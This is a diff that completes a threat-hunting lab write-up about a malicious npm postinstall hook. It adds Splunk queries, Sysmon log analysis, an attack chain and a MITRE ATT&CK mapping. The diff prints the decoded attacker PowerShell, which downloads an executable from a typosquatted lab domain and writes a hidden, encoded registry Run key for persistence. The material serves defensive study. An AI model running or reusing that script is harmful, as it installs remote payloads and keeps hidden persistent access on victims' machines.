@@ -202,26 +202,168 @@ powershell.exe     ← MALICIOUS (hidden, encoded command)
 |---|---|---|
 | Compromised third-party package used for initial access | ✅ Confirmed | `healthchk-lib@1.0.1` postinstall hook fired on install |
 | Malicious execution following initial access | ✅ Confirmed | Hidden PowerShell with encoded command spawned by node.exe |
-| Persistence mechanism | 🔄 Pending | Registry Run key - investigation continues |
 
 ---
 
-## 🔄 Phase 2 — Execution (In Progress)
-*Decoding the Base64 encoded PowerShell command to confirm what was executed.*
+## Findings - Phase 2: Execution
+ 
+### Query Used
+```spl
+index=* "global-update.wlndows.thm"
+```
+ 
+### What We Found
+ 
+---
+ 
+#### Log 5 - `10:58:29` | EventCode 22 | DNS query to typosquatted domain
+> ![Event Log 5 - npm install](https://raw.githubusercontent.com/Prajwal-Manjunath/Threat-Hunting-Simulation-Lab/main/images/event-log-5.png)
+
+| Field | Value |
+|---|---|
+| EventCode | 22 (DNS Query) |
+| Image | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
+| QueryName | `global-update.wlndows.thm` |
+| QueryResults | `::ffff:127.0.0.1` |
+| ProcessGuid | `{c5d2b969-9053-6856-e701-000000002a01}` |
+ 
+**What this tells us:**  
+Two seconds after the malicious PowerShell spawned, it made a DNS query to resolve `global-update.wlndows.thm` the typosquatted domain from our IOCs. This is PowerShell's `Invoke-WebRequest` attempting to download `SystemHealthUpdater.exe`. The ProcessGuid matches the hidden PowerShell from Log 4, directly linking this network activity to the malicious process.
+ 
+The domain resolved to `127.0.0.1` (localhost) because this is a lab environment. In a real attack this would resolve to an attacker-controlled server on the internet.
+
+### Decoded Malicious Script
+ 
+The Base64 encoded command from Log 4 was decoded using CyberChef (From Base64 → Decode UTF-16LE). The full decoded script:
+ 
+```powershell
+$dest = "$env:APPDATA\SystemHealthUpdater.exe"
+$url = "http://global-update.wlndows.thm/SystemHealthUpdater.exe"
+ 
+# Download file
+Invoke-WebRequest -Uri $url -OutFile $dest
+ 
+# Base64 encode the command
+$encoded = [Convert]::ToBase64String(
+    [Text.Encoding]::Unicode.GetBytes("Start-Process '$dest'")
+)
+ 
+# Build persistence command
+$runCmd = 'powershell.exe -NoP -W Hidden -EncodedCommand ' + $encoded
+ 
+# Add to registry for persistence
+Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
+    -Name 'Windows Update Monitor' -Value $runCmd
+```
+ 
+**What each section does:**
+ 
+| Section | Code | What It Does |
+|---|---|---|
+| 1 | `$dest` / `$url` | Sets the download destination and source URL |
+| 2 | `Invoke-WebRequest` | Downloads `SystemHealthUpdater.exe` silently to AppData |
+| 3 | `$encoded` / `$runCmd` | Builds a new hidden PowerShell command to launch the exe |
+| 4 | `Set-ItemProperty` | Writes that command to the registry Run key for persistence |
+ 
+The script handles both execution **and** persistence in a single pass. One PowerShell process three malicious actions.
 
 ---
 
-## 🔄 Phase 3 — Persistence (In Progress)
-*Hunting for the registry Run key written under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.*
-
+## Findings - Phase 3: Persistence
+ 
+### Query Used
+```spl
+index=* "Windows Update Monitor"
+```
+ 
+### What We Found
+ 
 ---
+ 
+#### Log 6 - `10:58:29` | EventCode 13 | Registry Run key written
+> ![Event Log 6 - npm install](https://raw.githubusercontent.com/Prajwal-Manjunath/Threat-Hunting-Simulation-Lab/main/images/event-log-6.png)
 
-## 🔄 Final Attack Chain
-*To be completed after all phases.*
-
+| Field | Value |
+|---|---|
+| EventCode | 13 (Registry Value Set) |
+| Image | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
+| TargetObject | `HKU\S-1-5-21-...\Software\Microsoft\Windows\CurrentVersion\Run\Windows Update Monitor` |
+| Details | `powershell.exe -NoP -W Hidden -EncodedCommand <base64>` |
+| RuleName | `T1060,RunKey` |
+| ProcessGuid | `{c5d2b969-9053-6856-e701-000000002a01}` |
+ 
+**What this tells us:**  
+The malicious PowerShell wrote a registry Run key named `Windows Update Monitor` — deliberately named to blend in with legitimate Windows processes. Every time Tom logs into Windows, this key silently fires a hidden PowerShell command that launches `SystemHealthUpdater.exe` from his AppData folder.
+ 
+The `Details` field contains another Base64 encoded command which decodes to:
+```powershell
+Start-Process 'C:\Users\Administrator\AppData\Roaming\SystemHealthUpdater.exe'
+```
+ 
+Note Sysmon itself tagged this with `RuleName: T1060,RunKey` — confirming this is a known persistence technique already mapped in the detection ruleset.
+ 
+**Key linking observation:**  
+The `ProcessGuid` across Logs 4, 5, and 6 is identical — `{c5d2b969-9053-6856-e701-000000002a01}`. One single malicious PowerShell process was responsible for the encoded execution, the DNS query, and the registry persistence write. This is the thread that ties the entire execution phase together.
+ 
 ---
-
-## 🔄 Scope & Impacted Assets
-*To be completed after full investigation.*
-
+ 
+## ✅ Final Attack Chain
+ 
+```
+[10:58:24] Tom opens PowerShell and runs npm install healthchk-lib@1.0.1
+                                ↓
+[10:58:27] node.exe writes postinstall.ps1 to disk
+           C:\Development\node_modules\healthchk-lib\scripts\postinstall.ps1
+                                ↓
+[10:58:27] node.exe spawns cmd.exe via postinstall hook
+           Tom sees nothing — happens silently in the background
+                                ↓
+[10:58:27] cmd.exe spawns powershell.exe -NoP -W Hidden -EncodedCommand
+           Hidden window, no profile, Base64 obfuscated payload
+                                ↓
+[10:58:29] PowerShell makes DNS query to global-update.wlndows.thm
+           Attempts to download SystemHealthUpdater.exe to %APPDATA%
+                                ↓
+[10:58:29] PowerShell writes registry Run key
+           HKCU\...\Run\Windows Update Monitor
+           Value: powershell.exe -NoP -W Hidden -EncodedCommand <Start-Process exe>
+                                ↓
+[Every login] SystemHealthUpdater.exe launches silently
+              Attacker maintains persistent access to Tom's machine
+```
+ 
+---
+ 
+## ✅ Hypothesis Validation — Final
+ 
+> **The hypothesis is CONFIRMED.**
+ 
+An attacker embedded a malicious `postinstall` hook inside the npm package `healthchk-lib@1.0.1`. When Tom ran `npm install`, the hook automatically executed a hidden PowerShell command that downloaded a payload from a typosquatted domain and established persistence via a registry Run key — all without Tom performing any action beyond a routine package install.
+ 
+---
+ 
+## ✅ Scope & Impacted Assets
+ 
+| Asset | Detail |
+|---|---|
+| Compromised Host | `PAW-TOM` |
+| Affected User | `PAW-TOM\itadmin-tom` |
+| Malicious Package | `healthchk-lib@1.0.1` |
+| Payload Staged | `%APPDATA%\SystemHealthUpdater.exe` |
+| Persistence Key | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows Update Monitor` |
+| C2 Domain Contacted | `global-update.wlndows.thm` |
+| Attack Duration | All activity within 5 seconds (10:58:24 → 10:58:29) |
+ 
+---
+ 
+## MITRE ATT&CK Summary
+ 
+| Tactic | Technique ID | Technique Name | Evidence |
+|---|---|---|---|
+| Initial Access | T1195.002 | Compromise Software Supply Chain | `healthchk-lib@1.0.1` postinstall hook |
+| Execution | T1059.001 | PowerShell | `powershell.exe -NoP -W Hidden -EncodedCommand` |
+| Defence Evasion | T1027 | Obfuscated Files or Information | Base64 encoded commands throughout |
+| Command & Control | T1071.001 | Web Protocols | HTTP download over port 80 |
+| Persistence | T1547.001 | Registry Run Keys / Startup Folder | `HKCU\...\Run\Windows Update Monitor` |
+ 
 ---
